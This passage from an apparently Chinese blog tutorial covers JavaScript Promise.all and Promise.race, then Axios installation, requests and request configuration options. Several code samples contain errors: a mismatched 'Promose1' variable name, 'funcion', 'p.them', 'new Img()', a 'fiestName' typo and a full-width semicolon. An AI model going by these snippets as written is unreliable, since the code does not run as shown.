class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> <span class="hljs-title class_">Promose1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">resolve,reject</span>)&#123;&#125;)<br><span class="hljs-keyword">let</span> <span class="hljs-title class_">Promise2</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">resolve,reject</span>)&#123;&#125;)<br><span class="hljs-keyword">let</span> <span class="hljs-title class_">Promise3</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">resolve,reject</span>)&#123;&#125;)<br><br><span class="hljs-keyword">let</span> p=<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-title class_">Promise1</span>,<span class="hljs-title class_">Promise2</span>,<span class="hljs-title class_">Promise3</span>])<br><br>p.<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;三个都执行成功则成功&quot;</span>)<br>&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;只要有失败则失败&quot;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>使用场景：一个游戏需要很多素材，只有所有素材都下载到本地之后，才开始初始化；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> video=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-title function_">funcion</span>(<span class="hljs-params">resolve,reject</span>)&#123;&#125;);<br><span class="hljs-keyword">let</span> word=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">resolve,reject</span>)&#123;&#125;);<br><br><span class="hljs-keyword">let</span> p=<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([video,word]);<br><br>p.<span class="hljs-title function_">them</span>(<span class="hljs-title function_">funcion</span>(<span class="hljs-params"></span>)&#123;<br>       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;开始初始化！&quot;</span>);<br>       &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;游戏初始化失败&quot;</span>)；<br>       &#125;)<br></code></pre></td></tr></table></figure><h4 id="6-race用法"><a href="#6-race用法" class="headerlink" title="6.race用法"></a>6.race用法</h4><p>谁跑的块，以谁为准执行回调；</p><p>可以用race给某个异步请求设置超时时间，并且在超时后执行相应的操作，代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">requestImg</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">var</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>&#123;<br>        <span class="hljs-keyword">var</span> img =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Img</span>();<br>        img.<span class="hljs-property">onload</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-title function_">resolve</span>(img);<br>        &#125;<br>        img.<span class="hljs-property">src</span>=<span class="hljs-string">&#x27;img path&#x27;</span>;<br>    &#125;);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-comment">//延时函数，用于计时</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">timeout</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>&#123;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>            <span class="hljs-title function_">reject</span>(<span class="hljs-string">&quot;请求图片超时！&quot;</span>);<br>        &#125;,<span class="hljs-number">5000</span>);<br>    &#125;);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><span class="hljs-comment">//调用</span><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">race</span>([<span class="hljs-title function_">requestImg</span>(), <span class="hljs-title function_">timeout</span>()]).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="二、基础定义Axios"><a href="#二、基础定义Axios" class="headerlink" title="二、基础定义Axios"></a>二、基础定义Axios</h3><h4 id="服务端它使用原生-node-js-http-模块-而在客户端-浏览端-则使用-XMLHttpRequests。"><a href="#服务端它使用原生-node-js-http-模块-而在客户端-浏览端-则使用-XMLHttpRequests。" class="headerlink" title="服务端它使用原生 node.js http 模块, 而在客户端 (浏览端) 则使用 XMLHttpRequests。"></a>服务端它使用原生 node.js <code>http</code> 模块, 而在客户端 (浏览端) 则使用 XMLHttpRequests。</h4><h4 id="1-特性"><a href="#1-特性" class="headerlink" title="1.特性"></a>1.特性</h4><ul><li>从浏览器创建 <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">XMLHttpRequests</a></li><li>从 node.js 创建 <a href="http://nodejs.org/api/http.html">http</a> 请求</li><li>支持 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise">Promise</a> API</li><li>拦截请求和响应</li><li>转换请求和响应数据</li><li>取消请求</li><li>自动转换JSON数据</li><li>客户端支持防御<a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">XSRF</a></li></ul><h4 id="2-安装使用"><a href="#2-安装使用" class="headerlink" title="2.安装使用"></a>2.安装使用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install axios<br>//yarn<br> yarn add axios<br></code></pre></td></tr></table></figure><h4 id="Get请求"><a href="#Get请求" class="headerlink" title="Get请求"></a>Get请求</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> axios=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;axios&#x27;</span>);<br><br><span class="hljs-comment">//向给定的ID用户发起请求</span><br>axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user?ID=12345&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;成功！&quot;</span>)<br>&#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;失败&quot;</span>);<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;总是执行的部分&quot;</span>);<br>&#125;)<br><br><span class="hljs-comment">//以上代码可以等价于</span><br>axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user&#x27;</span>,&#123;<br>    <span class="hljs-attr">params</span>:&#123;<br>        <span class="hljs-attr">ID</span>:<span class="hljs-number">12345</span><br>    &#125;<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;成功！&quot;</span>)<br>&#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;失败&quot;</span>);<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;总是执行的部分&quot;</span>);<br>&#125;)<br><br></code></pre></td></tr></table></figure><h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js">axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/user&#x27;</span>,&#123;<br>    <span class="hljs-attr">fiestName</span>:<span class="hljs-string">&#x27;Fred&#x27;</span>,<br>    <span class="hljs-attr">lastName</span>:<span class="hljs-string">&#x27;Smith&#x27;</span><br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>&#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err);<br>&#125;);<br><br><span class="hljs-comment">//多个POST请求</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserAccount</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/12345&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserPermissions</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/12345/permissions&#x27;</span>);<br>&#125;<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-title function_">getUserAccount</span>(),<span class="hljs-title function_">getUserPermissions</span>()]).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">results</span>)&#123;<br>    <span class="hljs-keyword">const</span> acct=results[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">const</span> perm=results[<span class="hljs-number">1</span>];<br>&#125;)<br></code></pre></td></tr></table></figure><h4 id="3-Axops-API"><a href="#3-Axops-API" class="headerlink" title="3.Axops API"></a>3.Axops API</h4><p>可以向 <code>axios</code> 传递相关配置来创建请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//发起一个post请求</span><br><span class="hljs-title function_">axios</span>(&#123;<br><span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<br>    <span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;/user/12345&#x27;</span>,<br>    <span class="hljs-attr">data</span>:&#123;<br>        <span class="hljs-attr">firstname</span>:<span class="hljs-string">&#x27;Martin&#x27;</span>,<br>        <span class="hljs-attr">lastname</span>:<span class="hljs-string">&#x27;Smith&#x27;</span><br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//在nodeJS用GET请求远程图片</span><br><span class="hljs-title function_">axios</span>(&#123;<br>    <span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;get&#x27;</span>,<br>    <span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://test/123&#x27;</span>,<br>    <span class="hljs-attr">responseType</span>:<span class="hljs-string">&#x27;stream&#x27;</span><br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>)=&gt;</span>&#123;<br>    response.<span class="hljs-property">data</span>.<span class="hljs-title function_">pipe</span>(fs.<span class="hljs-title function_">createWriteStream</span>(<span class="hljs-string">&#x27;test.jpg&#x27;</span>));<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="4-请求配置"><a href="#4-请求配置" class="headerlink" title="4.请求配置"></a>4.请求配置</h4><p>创建请求时可以用配置选项；只有url是必须的，如果没有指定method，则默认使用GET；</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    url<span class="hljs-punctuation">:</span>&#x27;/api/user&#x27;<span class="hljs-punctuation">,</span>          <span class="hljs-comment">//用于请求的服务器URL</span><br>    method<span class="hljs-punctuation">:</span>&#x27;get&#x27;<span class="hljs-punctuation">,</span><br>    baseUrl<span class="hljs-punctuation">:</span>&#x27;https<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.0.1:35000&#x27;,//自动加在url前；</span><br>    transformRequest<span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>        function(data<span class="hljs-punctuation">,</span>headers)<span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-comment">//对即将发送的data进行处理；</span><br>            return processedData;<br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    transformResponse<span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>        function(response)<span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-comment">//对收到的响应进行处理；</span><br>            return processedResponse;<br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    headers<span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>&#x27;X-Requested-With&#x27;<span class="hljs-punctuation">:</span> &#x27;XMLHttpRequest&#x27;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    params<span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        ID<span class="hljs-punctuation">:</span><span class="hljs-number">12345</span><span class="hljs-comment">//与请求一起发送的url参数；</span><br>    <span class="hljs-punctuation">&#125;</span>，<br>    <span class="hljs-comment">//data是作为请求体被发送的数据，仅适用于PUT，POST，DELETE和PATCH方法；</span><br>    <span class="hljs-comment">// 在没有设置 `transformRequest` 时，则必须是以下类型之一:</span><br>  <span class="hljs-comment">// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams</span><br>  <span class="hljs-comment">// - 浏览器专属: FormData, File, Blob</span><br>  <span class="hljs-comment">// - Node 专属: Stream, Buffer</span><br>    data<span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    firstname<span class="hljs-punctuation">:</span>&#x27;Fred&#x27;<span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-comment">// 发送请求体数据的可选语法</span><br>      <span class="hljs-comment">// 请求方式 post</span><br>      <span class="hljs-comment">// 只有 value 会被发送，key 则不会</span><br>      data<span class="hljs-punctuation">:</span> &#x27;Country=Brasil&amp;City=Belo Horizonte&#x27;<span class="hljs-punctuation">,</span><br><br><span class="hljs-comment">//timeout:指定请求超时的毫秒数；默认0ms；</span><br>timeout<span class="hljs-punctuation">:</span><span class="hljs-number">1000</span><span class="hljs-punctuation">,</span>  <br><br><span class="hljs-comment">//跨域时是否需要凭证；</span><br>withCredentials<span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-comment">// `adapter` 允许自定义处理请求，这使测试更加容易。</span><br>  <span class="hljs-comment">// 返回一个 promise 并提供一个有效的响应 （参见 lib/adapters/README.md）。</span><br>  adapter<span class="hljs-punctuation">:</span> function (config) <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-comment">/* ... */</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><br>  <span class="hljs-comment">// `auth` HTTP Basic Auth</span><br>  auth<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    username<span class="hljs-punctuation">:</span> &#x27;janedoe&#x27;<span class="hljs-punctuation">,</span><br>    password<span class="hljs-punctuation">:</span> &#x27;s00pers3cret&#x27;<br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><br>  <span class="hljs-comment">// `responseType` 表示浏览器将要响应的数据类型</span><br>  <span class="hljs-comment">// 选项包括: &#x27;arraybuffer&#x27;, &#x27;document&#x27;, &#x27;json&#x27;, &#x27;text&#x27;, &#x27;stream&#x27;</span><br>  <span class="hljs-comment">// 浏览器专属：&#x27;blob&#x27;</span><br>  responseType<span class="hljs-punctuation">:</span> &#x27;json&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-comment">// 默认值</span><br><br>  <span class="hljs-comment">// `responseEncoding` 表示用于解码响应的编码 (Node.js 专属)</span><br>  <span class="hljs-comment">// 注意：忽略 `responseType` 的值为 &#x27;stream&#x27;，或者是客户端请求</span><br>  <span class="hljs-comment">// Note: Ignored for `responseType` of &#x27;stream&#x27; or client-side requests</span><br>  responseEncoding<span class="hljs-punctuation">:</span> &#x27;utf8&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-comment">// 默认值</span><br><br>  <span class="hljs-comment">// `xsrfCookieName` 是 xsrf token 的值，被用作 cookie 的名称</span><br>  xsrfCookieName<span class="hljs-punctuation">:</span> &#x27;XSRF-TOKEN&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-comment">// 默认值</span><br><br>  <span class="hljs-comment">// `xsrfHeaderName` 是带有 xsrf token 值的http 请求头名称</span><br>  xsrfHeaderName<span class="hljs-punctuation">:</span> &#x27;X-XSRF-TOKEN&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-comment">// 默认值</span><br><br>  <span class="hljs-comment">// `onUploadProgress` 允许为上传处理进度事件</span><br>  <span class="hljs-comment">// 浏览器专属</span><br>  onUploadProgress<span class="hljs-punctuation">:</span> function (progressEvent) <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-comment">// 处理原生进度事件</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><br>  <span class="hljs-comment">// `onDownloadProgress` 允许为下载处理进度事件</span><br>  <span class="hljs-comment">// 浏览器专属</span><br>  onDownloadProgress<span class="hljs-punctuation">:</span> function (progressEvent) <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-comment">// 处理原生进度事件</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><br>  <span class="hljs-comment">// `maxContentLength` 定义了node.js中允许的HTTP响应内容的最大字节数</span><br>  maxContentLength<span class="hljs-punctuation">:</span> <span class="hljs-number">2000</span><span class="hljs-punctuation">,</span><br><br>  <span class="hljs-comment">// `maxBodyLength`（仅Node）定义允许的http请求内容的最大字节数</span><br>  maxBodyLength<span class="hljs-punctuation">:</span> <span class="hljs-number">2000</span><span class="hljs-punctuation">,</span><br><br>  <span class="hljs-comment">// `validateStatus` 定义了对于给定的 HTTP状态码是 resolve 还是 reject promise。</span><br>  <span class="hljs-comment">// 如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，</span><br>  <span class="hljs-comment">// 则promise 将会 resolved，否则是 rejected。</span><br>  validateStatus<span class="hljs-punctuation">:</span> function (status) <span class="hljs-punctuation">&#123;</span><br>    return status &gt;= <span class="hljs-number">200</span> &amp;&amp; status &lt; <span class="hljs-number">300</span>; <span class="hljs-comment">// 默认值</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><br>  <span class="hljs-comment">// `maxRedirects` 定义了在node.js中要遵循的最大重定向数。</span><br>  <span class="hljs-comment">// 如果设置为0，则不会进行重定向</span><br>  maxRedirects<span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 默认值</span><br><br>  <span class="hljs-comment">// `socketPath` 定义了在node.js中使用的UNIX套接字。</span><br>  <span class="hljs-comment">// e.g. &#x27;/var/run/docker.sock&#x27; 发送请求到 docker 守护进程。</span><br>  <span class="hljs-comment">// 只能指定 `socketPath` 或 `proxy` 。</span><br>  <span class="hljs-comment">// 若都指定，这使用 `socketPath` 。</span><br>  socketPath<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// default</span><br><br>  <span class="hljs-comment">// `httpAgent` and `httpsAgent` define a custom agent to be used when performing http</span><br>  <span class="hljs-comment">// and https requests, respectively, in node.js. This allows options to be added like</span><br>  <span class="hljs-comment">// `keepAlive` that are not enabled by default.</span><br>  httpAgent<span class="hljs-punctuation">:</span> new http.Agent(<span class="hljs-punctuation">&#123;</span> keepAlive<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span><br>  httpsAgent<span class="hljs-punctuation">:</span> new https.Agent(<span class="hljs-punctuation">&#123;</span> keepAlive<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span><br><br>  <span class="hljs-comment">// `proxy` 定义了代理服务器的主机名，端口和协议。</span><br>  <span class="hljs-comment">// 您可以使用常规的`http_proxy` 和 `https_proxy` 环境变量。</span><br>  <span class="hljs-comment">// 使用 `false` 可以禁用代理功能，同时环境变量也会被忽略。</span><br>  <span class="hljs-comment">// `auth`表示应使用HTTP Basic auth连接到代理，并且提供凭据。</span><br>  <span class="hljs-comment">// 这将设置一个 `Proxy-Authorization` 请求头，它会覆盖 `headers` 中已存在的自定义 `Proxy-Authorization` 请求头。</span><br>  <span class="hljs-comment">// 如果代理服务器使用 HTTPS，则必须设置 protocol 为`https`</span><br>  proxy<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    protocol<span class="hljs-punctuation">:</span> &#x27;https&#x27;<span class="hljs-punctuation">,</span><br>    host<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&#x27;<span class="hljs-punctuation">,</span><br>    port<span class="hljs-punctuation">:</span> <span class="hljs-number">9000</span><span class="hljs-punctuation">,</span><br>    auth<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      username<span class="hljs-punctuation">:</span> &#x27;mikeymike&#x27;<span class="hljs-punctuation">,</span><br>      password<span class="hljs-punctuation">:</span> &#x27;rapunz3l&#x27;<br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><br>  <span class="hljs-comment">// see https://axios-http.com/zh/docs/cancellation</span><br>  cancelToken<span class="hljs-punctuation">:</span> new CancelToken(function (cancel) <span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span><br><br>  <span class="hljs-comment">// `decompress` indicates whether or not the response body should be decompressed </span><br>  <span class="hljs-comment">// automatically. If set to `true` will also remove the &#x27;content-encoding&#x27; header </span><br>  <span class="hljs-comment">// from the responses objects of all decompressed responses</span><br>  <span class="hljs-comment">// - Node only (XHR cannot turn off decompression)</span><br>  decompress<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-comment">// 默认值</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h4 id="5-响应结构"><a href="#5-响应结构" class="headerlink" title="5.响应结构"></a>5.响应结构</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 